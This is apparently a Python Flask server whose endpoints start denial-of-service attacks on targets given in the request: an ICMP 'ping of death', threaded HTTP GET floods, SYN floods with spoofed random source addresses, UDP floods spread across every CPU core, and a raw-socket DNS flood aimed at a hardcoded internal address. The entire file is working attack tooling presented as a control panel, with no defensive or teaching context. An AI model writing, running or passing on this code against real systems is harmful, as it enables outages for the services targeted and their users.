from flask import Flask, request, jsonify
from flask_cors import CORS
from multiprocessing import Process, cpu_count
import socket
import threading
import struct
import random
import string
from scapy.all import *
import requests
import time

app = Flask(__name__)
CORS(app)

client_sockets = []
lock = threading.Lock()

def create_large_icmp_packet(size):
    def checksum(data):
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack("!"+str(len(data)//2)+"H", data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return s & 0xffff

    type = 8  # ICMP echo request
    code = 0
    chksum = 0
    id = random.randint(0, 65535)
    seq = 1
    payload = bytes(random.getrandbits(8) for _ in range(size))
    header = struct.pack('!BBHHH', type, code, chksum, id, seq)
    chksum = checksum(header + payload)
    header = struct.pack('!BBHHH', type, code, chksum, id, seq)
    return header + payload

def send_ping_of_death(target_ip, packet_size, count):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        for i in range(count):
            icmp_packet = create_large_icmp_packet(packet_size)
            sock.sendto(icmp_packet, (target_ip, 0))
            print(f"Sent Ping of Death packet {i+1}/{count} to {target_ip}")
        sock.close()
    except socket.error as e:
        print(f"Socket error: {e}")

def flood(target_url):
    while True:
        try:
            response = requests.get(target_url)
            print(f"Sent GET request to {target_url}")
        except Exception as e:
            print(f"Failed to send request: {e}")

def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(counter):
        s_port = random.randint(1024, 65535)
        s_eq = random.randint(0, 4294967295)
        window = random.randint(0, 65535)

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = window

        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1
    print("\nTotal packets sent: %i\n" % total)

def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def send_one(ip, port, data=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        msg = data.encode() if data else b'\x08\x00\x43\x52\x00\x01\x0a\x09\x61\x62\x63\x64\x65\x66\x67\x68\x69'
        sock.sendto(msg, (ip, port))
        sock.close()
    except socket.error as e:
        print(f"Socket error: {e}")

def run_worker(host, port, delay, silent, data):
    packets_sent = 0
    print(f"Flooding {host} with UDP packets on port {port}")
    while True:
        send_one(host, port, data)
        packets_sent += 1
        if not silent:
            if data:
                print(f'Custom packets sent: {packets_sent}')
            else:
                print(f'Packets sent: {packets_sent}')
        time.sleep(delay / 1000)

class DNSHeader:
    def __init__(self, xid, flags, qdcount, ancount, nscount, arcount):
        self.xid = xid
        self.flags = flags
        self.qdcount = qdcount
        self.ancount = ancount
        self.nscount = nscount
        self.arcount = arcount

class DNSQuestion:
    def __init__(self, name, dnstype, dnsclass):
        self.name = name
        self.dnstype = dnstype
        self.dnsclass = dnsclass

def get_rand_str(size):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(size))

def dns_flood():
    target_ip = "10.0.2.14"
    target_port = 53

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    source_ip = "10.0.2.20"
    source_port = random.randint(1024, 65535)

    dns_payload = b""

    xid = random.randint(0, 65535)
    flags = 0x0100
    qdcount = 1
    ancount = 0
    nscount = 0
    arcount = 0
    dns_header = DNSHeader(xid, flags, qdcount, ancount, nscount, arcount)
    dns_payload += struct.pack("!HHHHHH", dns_header.xid, dns_header.flags,
                                dns_header.qdcount, dns_header.ancount,
                                dns_header.nscount, dns_header.arcount)

    domain_name = get_rand_str(5) + "." + get_rand_str(5) + "." + get_rand_str(5)
    dnstype = 1
    dnsclass = 1
    dns_question = DNSQuestion(domain_name.encode(), dnstype, dnsclass)
    dns_payload += dns_question.name + struct.pack("!HH", dns_question.dnstype, dns_question.dnsclass)

    udp_header = struct.pack("!HHHH", source_port, target_port, 8 + len(dns_payload), 0)
    udp_packet = udp_header + dns_payload

    ip_header = struct.pack("!BBHHHBBH4s4s", 4 << 4 | 5, 0, 20 + len(udp_packet), 0,
                            255, socket.IPPROTO_UDP, 0, socket.inet_aton(source_ip),
                            socket.inet_aton(target_ip))
    ip_packet = ip_header + udp_packet

    sock.sendto(ip_packet, (target_ip, target_port))

@app.route('/icmp', methods=['POST'])
def icmp_attack():
    data = request.json
    target_ip = data['target_ip']
    packet_size = int(data['packet_size'])
    count = int(data['count'])
    threading.Thread(target=send_ping_of_death, args=(target_ip, packet_size, count)).start()
    return jsonify({"status": "ICMP Attack Started"})

@app.route('/http', methods=['POST'])
def http_flood():
    data = request.json
    target_url = data['target_url']
    num_threads = int(data['num_threads'])
    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_url,))
        thread.start()
    return jsonify({"status": "HTTP Flood Attack Started"})

@app.route('/syn', methods=['POST'])
def syn_flood():
    data = request.json
    dstIP = data['dstIP']
    dstPort = int(data['dstPort'])
    counter = int(data['counter'])
    threading.Thread(target=SYN_Flood, args=(dstIP, dstPort, counter)).start()
    return jsonify({"status": "SYN Flood Attack Started"})

@app.route('/udp', methods=['POST'])
def udp_flood():
    data = request.json
    host = data['host']
    port = int(data['port'])
    delay = int(data['delay'])
    data_to_send = data['data']
    silent = data['silent']
    for _ in range(cpu_count()):
        p = Process(target=run_worker, args=(host, port, delay, silent, data_to_send))
        p.start()
    return jsonify({"status": "UDP Flood Attack Started"})

@app.route('/dns', methods=['POST'])
def dns_flood_endpoint():
    threading.Thread(target=dns_flood).start()
    return jsonify({"status": "DNS Flood Attack Started"})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=4448)
